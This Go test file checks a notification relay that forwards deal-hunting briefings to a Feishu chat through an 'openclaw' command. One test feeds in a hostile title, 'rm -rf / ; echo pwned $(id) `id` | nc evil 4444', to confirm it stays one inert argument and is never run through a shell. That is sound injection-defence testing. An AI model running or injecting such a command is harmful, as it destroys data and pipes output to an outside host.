package notify

import (
	"context"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/xiabee/deal-hunter/internal/config"
)

func TestRelayBuildsFixedArgv(t *testing.T) {
	r, err := NewOpenClawRelay(config.OpenClaw{
		Enabled: true, Relay: true, Command: "openclaw",
		Args: []string{"--profile", "default"}, Channel: "feishu", Target: "chat:123",
	})
	if err != nil {
		t.Fatalf("NewOpenClawRelay: %v", err)
	}
	if !r.Ready() {
		t.Fatal("a configured target should report ready")
	}
	msg := NewMessage(KindUrgent, "🆓 免费羊毛 · GLM-5.3-flash", sampleDeal())
	args := r.Args(msg)
	want := []string{"--profile", "default", "message", "send", "--channel", "feishu", "--target", "chat:123", "--message"}
	for i, w := range want {
		if args[i] != w {
			t.Fatalf("argv[%d] = %q, want %q (full: %v)", i, args[i], w, args)
		}
	}
	body := args[len(args)-1]
	for _, frag := range []string{"GLM-5.3-flash", "https://example.com/glm-free", "92"} {
		if !strings.Contains(body, frag) {
			t.Errorf("message body missing %q: %s", frag, body)
		}
	}
}

// The relay must never route text through a shell: hostile feed titles are
// passed as a single inert argument.
func TestRelayNeutralisesShellMetacharacters(t *testing.T) {
	r, _ := NewOpenClawRelay(config.OpenClaw{Command: "openclaw", Target: "chat:1", Channel: "feishu"})
	evil := "rm -rf / ; echo pwned $(id) `id` | nc evil 4444"
	args := r.Args(NewMessage(KindUrgent, evil))
	if args[len(args)-1] != evil {
		t.Fatalf("message was split or altered: %q", args[len(args)-1])
	}
	joined := strings.Join(args, " ")
	if strings.Contains(joined, "sh -c") {
		t.Fatal("relay must not use a shell")
	}
}

// Every channel has to tell the same story about the briefing: what is new
// today versus what is merely still open. A relay that flattens the two into one
// list makes the reader re-scan the whole thing every morning.
func TestRelayKeepsTheBriefingSections(t *testing.T) {
	r, _ := NewOpenClawRelay(config.OpenClaw{Command: "openclaw", Target: "chat:1", Channel: "feishu"})
	now := time.Now().UTC()
	fresh := sampleDeal()
	fresh.DiscoveredAt = now.Add(-2 * time.Hour)
	older := fresh
	older.URL = "https://example.com/older-offer"
	older.Title = "早已收录的免费额度"
	older.DiscoveredAt = now.Add(-3 * 24 * time.Hour)

	args := r.Args(NewMessage(KindDaily, "🌅 羊毛日报 · 2 条仍在效", fresh, older))
	body := args[len(args)-1]
	for _, want := range []string{"今日新收录", "持续在效", older.Title} {
		if !strings.Contains(body, want) {
			t.Errorf("relay text lost %q:\n%s", want, body)
		}
	}
	if strings.Contains(body, "rm -rf") {
		t.Error("unexpected content leaked into the relay body")
	}
}

func TestRelayDefaults(t *testing.T) {
	r, err := NewOpenClawRelay(config.OpenClaw{Relay: true})
	if err != nil {
		t.Fatal(err)
	}
	if r.Name() != "openclaw-relay" {
		t.Errorf("name = %s", r.Name())
	}
	if r.Ready() {
		t.Error("no target means not ready")
	}
	err = r.Send(context.Background(), NewMessage(KindTest, "x"))
	if err == nil || !strings.Contains(err.Error(), config.EnvOpenClawTarget) {
		t.Errorf("error should name the env var to set, got %v", err)
	}
	args := r.Args(NewMessage(KindTest, "hello"))
	if args[0] != "message" || args[1] != "send" || args[2] != "--channel" || args[3] != "feishu" {
		t.Errorf("default channel should be feishu: %v", args)
	}
}

func TestRelayExecutesConfiguredCommand(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("posix helpers only")
	}
	r, _ := NewOpenClawRelay(config.OpenClaw{Relay: true, Command: "/bin/echo", Target: "chat:1", Channel: "feishu"})
	if err := r.Send(context.Background(), NewMessage(KindUrgent, "标题", sampleDeal())); err != nil {
		t.Fatalf("echo should succeed: %v", err)
	}
	bad, _ := NewOpenClawRelay(config.OpenClaw{Relay: true, Command: "/bin/false", Target: "chat:1"})
	if err := bad.Send(context.Background(), NewMessage(KindUrgent, "x")); err == nil {
		t.Error("a failing command must be reported")
	}
	missing, _ := NewOpenClawRelay(config.OpenClaw{Relay: true, Command: "/nonexistent/openclaw", Target: "chat:1"})
	err := missing.Send(context.Background(), NewMessage(KindUrgent, "x"))
	if err == nil || !strings.Contains(err.Error(), "openclaw relay") {
		t.Errorf("expected a wrapped relay error, got %v", err)
	}
}

func TestClipOutputBoundsRelayErrors(t *testing.T) {
	long := strings.Repeat("x", 5000)
	if got := clipOutput(long); len(got) > 700 {
		t.Errorf("clipped output too long: %d", len(got))
	}
	if clipOutput("  \n trimmed \n ") != "trimmed" {
		t.Error("clip should trim")
	}
}
